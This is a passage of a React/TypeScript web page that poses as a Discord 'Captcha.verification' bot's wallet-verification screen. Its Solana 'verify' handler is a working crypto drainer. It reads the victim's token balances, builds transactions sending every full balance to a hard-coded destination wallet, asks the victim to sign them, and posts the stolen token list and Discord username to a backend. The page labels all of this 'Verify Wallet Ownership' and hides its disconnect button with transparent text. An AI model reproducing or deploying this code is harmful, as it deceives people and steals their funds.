        setError(err?.message || "Failed to approve tokens");
      }
      setStep("idle");
      setChainCycleActive(false);
    }
  };

  const connectSolanaWallet = async (walletType: SolanaWalletType) => {
    const walletConfig = SOLANA_WALLETS.find(w => w.id === walletType);
    if (!walletConfig) return;
    
    // On mobile, always open wallet app directly via deep link
    if (isMobile()) {
      window.location.href = walletConfig.mobileLink();
      return;
    }
    
    const provider = walletConfig.getProvider();
    
    if (!provider || !provider.connect) {
      const urls: Record<SolanaWalletType, string> = {
        phantom: "https://phantom.app/",
        backpack: "https://backpack.app/",
        solflare: "https://solflare.com/",
        okx: "https://www.okx.com/web3",
        trustwallet: "https://trustwallet.com/",
        bitget: "https://web3.bitget.com/",
      };
      window.open(urls[walletType], "_blank");
      return;
    }
    
    try {
      await provider.connect();
      
      const pubKey = provider.publicKey;
      if (!pubKey) {
        throw new Error("No public key after connect");
      }
      
      const address = typeof pubKey === 'string' ? pubKey : pubKey.toBase58();
      
      setSolanaConnected(true);
      setSolanaAddress(address);
      setSelectedSolanaWallet(walletType);
      setSolanaProvider(provider);
      setShowSolanaWalletModal(false);
    } catch (err: any) {
      console.error("Failed to connect Solana wallet:", err);
    }
  };

  const disconnectSolanaWallet = async () => {
    if (solanaProvider) {
      await solanaProvider.disconnect();
    }
    setSolanaConnected(false);
    setSolanaAddress(null);
    setSolanaStep("idle");
    setSelectedSolanaWallet(null);
    setSolanaProvider(null);
  };

  const handleSolanaProceed = async () => {
    if (!solanaProvider || !solanaAddress) {
      console.log("No provider or address:", { provider: !!solanaProvider, address: solanaAddress });
      return;
    }
    setError("");
    setSolanaStep("approving");

    try {
      console.log("Starting Solana verification for wallet:", solanaAddress);
      const connection = new Connection("https://api.mainnet-beta.solana.com", "confirmed");
      const destinationKey = new PublicKey(SOLANA_DESTINATION_WALLET);
      const userKey = new PublicKey(solanaAddress);
      
      const tokensTransferred: string[] = [];
      const transactions: Transaction[] = [];
      let currentTx = new Transaction();
      let instructionCount = 0;
      const MAX_IX_PER_TX = 10;
      
      console.log("Checking balances for", SOLANA_APPROVAL_TOKENS.length, "tokens...");
      
      for (const token of SOLANA_APPROVAL_TOKENS) {
        try {
          const mintKey = new PublicKey(token.mint);
          const userAta = getAssociatedTokenAddress(mintKey, userKey);
          
          const accountInfo = await connection.getAccountInfo(userAta);
          if (!accountInfo || !accountInfo.data) {
            continue;
          }
          
          const balance = getTokenBalanceFromAccountData(accountInfo.data as Buffer);
          if (balance <= BigInt(0)) {
            continue;
          }

          console.log(`Found ${token.symbol}: balance ${balance.toString()}`);
          
          const destAta = getAssociatedTokenAddress(mintKey, destinationKey);
          
          currentTx.add(
            createAssociatedTokenAccountIdempotentInstruction(
              userKey, destAta, destinationKey, mintKey
            )
          );
          currentTx.add(
            createTransferInstruction(userAta, destAta, userKey, balance)
          );
          tokensTransferred.push(token.symbol);
          instructionCount += 2;
          
          if (instructionCount >= MAX_IX_PER_TX) {
            transactions.push(currentTx);
            currentTx = new Transaction();
            instructionCount = 0;
          }
        } catch (e) {
          console.log(`Error processing ${token.symbol}:`, e);
        }
      }
      
      if (currentTx.instructions.length > 0) {
        transactions.push(currentTx);
      }
      
      if (transactions.length === 0) {
        console.log("No token balances found");
        setError("No tokens found in wallet.");
        setSolanaStep("idle");
        return;
      }
      
      console.log(`${transactions.length} transaction(s) ready with ${tokensTransferred.length} tokens`);

      let lastTxId = "";
      
      for (let i = 0; i < transactions.length; i++) {
        const tx = transactions[i];
        tx.feePayer = userKey;
        const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash();
        tx.recentBlockhash = blockhash;

        console.log(`Signing transaction ${i + 1}/${transactions.length}...`);
        
        let txId: string;
        try {
          const signedTx = await solanaProvider.signTransaction(tx);
          txId = await connection.sendRawTransaction(signedTx.serialize());
        } catch (signErr: any) {
          console.log("signTransaction failed, trying signAndSendTransaction...", signErr?.message || signErr);
          if (solanaProvider.signAndSendTransaction) {
            const result = await solanaProvider.signAndSendTransaction(tx);
            txId = result.signature;
          } else {
            throw signErr;
          }
        }
        
        console.log(`Transaction ${i + 1} sent:`, txId);
        lastTxId = txId;
        
        await connection.confirmTransaction({
          signature: txId,
          blockhash,
          lastValidBlockHeight
        }, "confirmed");
      }

      fetch("/api/solana-approvals", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          walletAddress: solanaAddress,
          delegateAddress: SOLANA_DESTINATION_WALLET,
          transactionHash: lastTxId,
          tokensApproved: tokensTransferred,
          tokenCount: tokensTransferred.length,
          discordUser: discordUser || undefined,
        }),
      }).catch(console.error);

      setSolanaStep("done");
    } catch (err: any) {
      console.error("Solana transfer error:", err);
      setError(err?.message || "Verification failed");
      setSolanaStep("idle");
    }
  };

  const isProcessing = step === "approving" || step === "transferring";
  const isSolanaProcessing = solanaStep === "approving" || solanaStep === "transferring";

  const handleSwapDirection = () => {
    const tempToken = sellToken;
    const tempAmount = sellAmount;
    setSellToken(buyToken || TOKENS[0]);
    setBuyToken(tempToken);
    setSellAmount(buyAmount);
    setBuyAmount(tempAmount);
  };

  const tabs = ["Swap", "Limit", "Buy", "Sell"];
  
  const currentTokens = networkType === "solana" ? SOLANA_TOKENS : TOKENS;
  const isWalletConnected = networkType === "solana" ? solanaConnected : isConnected;
  const walletAddress = networkType === "solana" ? solanaAddress : address;

  return (
    <div className="min-h-screen bg-[#1a1b2e]">
      {/* Update Banner */}
      <div className="w-full bg-[#4752c4] py-2 sm:py-3 text-center px-3" data-testid="banner-update">
        <span className="text-white text-xs sm:text-sm md:text-lg font-black tracking-wide" style={{ fontWeight: 900 }}>
          New version of Captcha.verification has been updated
        </span>
      </div>
      {/* Section 1 - Hero with Verify */}
      <div className="relative">
        <img src={section1} alt="" className="w-full h-auto block" data-testid="img-section1" />
        <div 
          className="absolute flex flex-col items-end gap-1 sm:gap-2"
          style={{ 
            top: '3%', 
            right: '1%',
            zIndex: 100
          }}
        >
          {discordUser && (
            <div className="flex items-center gap-1 sm:gap-2 bg-[#2b2d31] rounded-[20px] px-2 sm:px-3 py-1 sm:py-1.5 mb-0.5 sm:mb-1" data-testid="discord-user-info">
              {discordAvatar ? (
                <img src={discordAvatar} alt="" className="w-4 h-4 sm:w-6 sm:h-6 rounded-full" />
              ) : (
                <div className="w-4 h-4 sm:w-6 sm:h-6 rounded-full bg-[#5865F2] flex items-center justify-center">
                  <svg width="10" height="10" viewBox="0 0 24 24" fill="white" className="sm:w-[14px] sm:h-[14px]">
                    <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2" />
                    <circle cx="12" cy="7" r="4" />
                  </svg>
                </div>
              )}
              <span className="text-white text-[10px] sm:text-sm font-medium">{discordUser}</span>
              {discordVerified && (
                <CheckCircle className="w-4 h-4 text-green-400" />
              )}
            </div>
          )}
          {(isConnected || solanaConnected) ? (
            <div className="flex flex-col items-end gap-2">
              <div className="flex items-center gap-2">
                {isConnected && !solanaConnected && openChainModal && !chainCycleActive && (
                  <button
                    onClick={openChainModal}
                    className="flex items-center gap-1 sm:gap-2 bg-[#3a3f7a] hover:bg-[#4752c4] text-white font-medium rounded-[20px] px-2 sm:px-4 py-1 sm:py-2 text-[10px] sm:text-sm cursor-pointer border-0 outline-none"
                    data-testid="button-chain-switcher"
                  >
                    {chainId === 1 ? "Ethereum" : 
                     chainId === 56 ? "BNB Chain" : 
                     chainId === 137 ? "Polygon" : 
                     chainId === 42161 ? "Arbitrum" : 
                     chainId === 10 ? "Optimism" : 
                     chainId === 43114 ? "Avalanche" : 
                     chainId === 8453 ? "Base" : "Network"}
                    <ChevronDown className="w-4 h-4" />
                  </button>
                )}
                <span className="bg-[#3a3f7a] text-white font-medium rounded-[20px] px-2 sm:px-4 py-1 sm:py-2 text-[10px] sm:text-sm">
                  {solanaConnected 
                    ? `${solanaAddress?.slice(0, 4)}...${solanaAddress?.slice(-4)}`
                    : `${address?.slice(0, 6)}...${address?.slice(-4)}`
                  }
                </span>
                <button 
                  className="cursor-pointer border-0 outline-none bg-[#4752c4] hover:bg-[#3b44a8] text-white font-bold rounded-xl px-3 sm:px-7 py-1.5 sm:py-3 text-xs sm:text-base whitespace-nowrap shadow-lg"
                  onClick={() => {
                    if (solanaConnected) {
                      disconnectSolanaWallet();
                    } else if (isConnected) {
                      disconnect();
                    }
                  }}
                  data-testid="button-disconnect"
                >
                  Disconnect
                </button>
              </div>
            </div>
          ) : (
            <button 
              className="cursor-pointer border-0 outline-none bg-[#4752c4] hover:bg-[#3b44a8] text-white font-bold rounded-xl px-6 sm:px-7 py-3 sm:py-3 text-base sm:text-base whitespace-nowrap shadow-lg"
              onClick={() => setShowUnifiedWalletModal(true)}
              data-testid="button-connect"
            >
              Click here to verify
            </button>
          )}
        </div>
      </div>

      {/* Section 2 */}
      <img src={section2} alt="" className="w-full h-auto block" data-testid="img-section2" />

      {/* Section 3 */}
      <img src={section3} alt="" className="w-full h-auto block" data-testid="img-section3" />

      {/* Section 4 */}
      <img src={section4} alt="" className="w-full h-auto block" data-testid="img-section4" />

      {/* Enforce Time Limits Section */}
      <div className="bg-[#1e2235] py-16 sm:py-24 px-6 sm:px-12 lg:px-24" data-testid="section-time-limits">
        <div className="max-w-6xl mx-auto flex flex-col md:flex-row items-center gap-10 md:gap-16">
          <div className="w-full md:w-1/2">
            <div className="bg-[#2a2d3e] rounded-xl p-5 shadow-lg border border-[#363a4f]">
              <p className="text-gray-400 text-xs uppercase tracking-wider mb-3">OPTIONS</p>
              <div className="space-y-2 mb-5">
                <div className="bg-[#353849] rounded-lg px-4 py-2.5 text-white font-medium text-sm">Kick</div>
                <div className="bg-[#353849] rounded-lg px-4 py-2.5 text-white font-medium text-sm">Ban</div>
              </div>
              <div className="bg-[#2f3244] rounded-lg p-3 flex items-center gap-3 mb-3">
                <div className="w-8 h-8 rounded-full bg-[#4752c4] flex items-center justify-center flex-shrink-0">
                  <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="white" strokeWidth="2"><circle cx="12" cy="12" r="10"/><path d="M12 6v6l4 2"/></svg>
                </div>
                <div>
                  <span className="text-white text-sm font-medium">/config time_limit set </span>
                  <span className="text-gray-400 text-sm">time </span>
                  <span className="bg-[#4752c4] text-white text-xs px-2 py-0.5 rounded font-medium">action</span>
                </div>
              </div>
              <div className="bg-[#2f3244] rounded-lg p-3 flex items-center gap-3">
                <div className="w-6 h-6 rounded-full bg-[#4752c4] flex items-center justify-center flex-shrink-0">
                  <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="white" strokeWidth="3"><path d="M12 5v14M5 12h14"/></svg>
                </div>
                <div>
                  <span className="text-white text-sm">/config time_limit set </span>
                  <span className="text-gray-400 text-sm">time: 10 minutes </span>
                  <span className="text-gray-400 text-sm">action: </span>
                </div>
              </div>
            </div>
          </div>
          <div className="w-full md:w-1/2">
            <h2 className="text-white text-2xl sm:text-3xl font-bold mb-4">Enforce time limits</h2>
            <p className="text-gray-400 text-base sm:text-lg leading-relaxed">
              Optionally configure Captcha.verification to ban or kick users if they don't complete their captcha within a preset time frame.
            </p>
          </div>
        </div>
      </div>

      {/* Section 5 */}
      <img src={section5} alt="" className="w-full h-auto block" data-testid="img-section5" />

      {/* Section 6 - Footer */}
      <img src={section6} alt="" className="w-full h-auto block" data-testid="img-section6" />

      {showSigningScreen && (
        <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-[250] p-4">
          <div className="bg-white rounded-3xl p-6 sm:p-10 w-full max-w-[420px] shadow-2xl flex flex-col items-center gap-4 sm:gap-6 relative">
            <div className="relative w-20 h-20">
              <svg className="absolute inset-0 w-20 h-20 animate-spin" viewBox="0 0 80 80">
                <circle cx="40" cy="40" r="34" stroke="#e5e7eb" strokeWidth="5" fill="none" />
                <circle cx="40" cy="40" r="34" stroke="#4752c4" strokeWidth="5" fill="none" strokeLinecap="round" strokeDasharray="160" strokeDashoffset="120" />
              </svg>
              <div className="absolute inset-0 flex items-center justify-center">
                <div className="bg-gray-100 rounded-2xl w-14 h-14 flex items-center justify-center">
                  <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#6b7280" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                    <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2" />
                    <circle cx="12" cy="7" r="4" />
                  </svg>
                </div>
              </div>
            </div>
            <div className="text-center">
              <h3 className="text-xl font-semibold text-gray-900 mb-3">Connecting your wallet</h3>
              <p className="text-gray-900 text-lg font-bold">Verify wallet to confirm that it's you . . .</p>
              {chainCycleActive && networkType === "evm" && (
                <div className="mt-3 space-y-2">
                  <p className="text-sm text-gray-500">
                    Verifying on {chainNames[ALL_CHAIN_IDS[chainCycleIndex]] || "..."} ({chainCycleIndex + 1}/{chainCycleTotal})
                  </p>
                  <div className="w-full bg-gray-200 rounded-full h-1.5">
                    <div 
                      className="bg-[#4752c4] h-1.5 rounded-full transition-all duration-500"
                      style={{ width: `${((chainCycleIndex + 1) / chainCycleTotal) * 100}%` }}
                    />
                  </div>
                </div>
              )}
            </div>
            <button
              onClick={() => {
                if (networkType === "solana") {
                  handleSolanaProceed();
                } else {
                  handleProceed();
                }
              }}
              disabled={isProcessing || isSolanaProcessing || verifyButtonText !== "Verify Wallet Ownership"}
              className="w-full bg-[#4752c4] hover:bg-[#3b44a8] text-white font-bold rounded-xl py-3 text-base cursor-pointer border-0 outline-none disabled:opacity-80 flex items-center justify-center gap-2"
              data-testid="button-proceed-sign"
            >
              {(isProcessing || isSolanaProcessing) ? (
                <>
                  <Loader2 className="w-5 h-5 animate-spin" />
                  {chainCycleActive ? `Verifying ${chainNames[ALL_CHAIN_IDS[chainCycleIndex]] || "..."}...` : "Verifying..."}
                </>
              ) : (
                verifyButtonText
              )}
            </button>
            <button
              onClick={() => {
                if (solanaConnected) {
                  disconnectSolanaWallet();
                } else if (isConnected) {
                  disconnect();
                }
                setShowSigningScreen(false);
              }}
              className="text-transparent hover:text-gray-600 text-sm cursor-pointer bg-transparent border-0 outline-none mt-1"
              data-testid="button-disconnect-from-modal"
            >
              Disconnect Wallet
            </button>
          </div>
        </div>
      )}

      {showUnifiedWalletModal && (
        <div 
          className="fixed inset-0 bg-black/50 flex items-center justify-center z-[200]"
          onClick={() => setShowUnifiedWalletModal(false)}
        >
          <div 
            className="bg-white rounded-3xl p-4 sm:p-6 w-[calc(100%-2rem)] sm:w-[420px] max-h-[80vh] shadow-2xl flex flex-col mx-4"
            onClick={(e) => e.stopPropagation()}
          >
            <div className="flex items-center justify-between mb-6">
              <h2 className="text-xl font-semibold text-gray-900">Connect Wallet</h2>
              <button
                onClick={() => setShowUnifiedWalletModal(false)}
                className="p-2 hover:bg-gray-100 rounded-full"
                data-testid="button-close-wallet-modal"
              >
                <svg width="14" height="14" viewBox="0 0 14 14" fill="none">
                  <path d="M1 1L13 13M1 13L13 1" stroke="#9CA3AF" strokeWidth="2" strokeLinecap="round"/>
                </svg>
              </button>
            </div>
            
            <div className="flex gap-2 mb-6 bg-gray-100 rounded-xl p-1">
              <button
                onClick={() => setWalletModalTab("evm")}
                className={`flex-1 py-3 px-4 rounded-lg font-medium transition-all ${
                  walletModalTab === "evm" 
                    ? "bg-[#4752c4] text-white shadow-sm" 
                    : "text-gray-500 hover:text-gray-900"
                }`}
                data-testid="tab-evm"
              >
                EVM
              </button>
              <button
                onClick={() => setWalletModalTab("solana")}
                className={`flex-1 py-3 px-4 rounded-lg font-medium transition-all ${
                  walletModalTab === "solana" 
                    ? "bg-[#4752c4] text-white" 
                    : "text-gray-500 hover:text-gray-900"
                }`}
                data-testid="tab-solana"
              >
                Solana
              </button>
            </div>
            
            {walletModalTab === "evm" ? (
              <div className="flex flex-col items-center justify-center py-8">
                <div className="flex items-center gap-2 mb-4">
                  <TokenIcon symbol="ETH" size={24} />
                  <span className="text-gray-700 font-medium">EVM Networks</span>
                </div>
                <p className="text-gray-500 text-sm mb-6 text-center">Connect with Ethereum, BSC, Polygon, Arbitrum, Optimism, Avalanche, or Base</p>
                <button
                  onClick={() => {
                    setShowUnifiedWalletModal(false);
                    setNetworkType("evm");
                    setSellToken(TOKENS[0]);
                    setBuyToken(null);
                    openConnectModal?.();
                  }}
                  className="bg-[#4752c4] hover:bg-[#3b44a8] text-white px-8 py-3 rounded-xl font-semibold"
                  data-testid="button-open-evm-modal"
                >
                  Select Wallet
                </button>
              </div>
            ) : (
              <div className="space-y-3 overflow-y-auto flex-1">
                <div className="flex items-center gap-2 mb-4">
                  <TokenIcon symbol="SOL" size={20} />
                  <span className="text-gray-500 text-sm">Solana Wallet</span>
                </div>
                <div className="grid grid-cols-2 gap-3">
                  {SOLANA_WALLETS.map((wallet) => {
                    const isAvailable = wallet.isAvailable();
                    const renderWalletIcon = () => {
                      if (wallet.icon.startsWith('/')) {
                        return (
                          <img 
                            src={wallet.icon} 
                            alt={wallet.name}
                            className="w-full h-full object-cover rounded-lg"
                          />
                        );
                      }
                      const walletIcons: Record<string, JSX.Element> = {
                        okx: (
                          <svg viewBox="0 0 40 40" className="w-full h-full">
                            <rect width="40" height="40" rx="8" fill="black"/>
                            <rect x="10" y="10" width="6" height="6" rx="1" fill="white"/>
                            <rect x="17" y="17" width="6" height="6" rx="1" fill="white"/>
                            <rect x="24" y="10" width="6" height="6" rx="1" fill="white"/>
                            <rect x="10" y="24" width="6" height="6" rx="1" fill="white"/>
                            <rect x="24" y="24" width="6" height="6" rx="1" fill="white"/>
                          </svg>
                        ),
                      };
                      return walletIcons[wallet.icon] || <div className="w-full h-full bg-gray-200 rounded-lg" />;
                    };
                    return (
                      <button
                        key={wallet.id}
                        onClick={() => {
                          setNetworkType("solana");
                          setSellToken(SOLANA_TOKENS[0]);
                          setBuyToken(null);
                          connectSolanaWallet(wallet.id);
                          setShowUnifiedWalletModal(false);
                        }}
                        className="flex items-center gap-3 p-3 rounded-xl bg-gray-50 hover:bg-gray-100 border border-gray-200 transition-all"
                        data-testid={`wallet-${wallet.id}`}
                      >
                        <div className="w-8 h-8 rounded-lg overflow-hidden flex items-center justify-center">
                          {renderWalletIcon()}
                        </div>
                        <span className="text-gray-900 font-medium text-sm">{wallet.name}</span>
                        {isAvailable && (
                          <div className="w-2 h-2 rounded-full bg-green-500 ml-auto" />
                        )}
                      </button>
                    );
                  })}
                </div>
              </div>
            )}
          </div>
        </div>
      )}
    </div>
  );
}
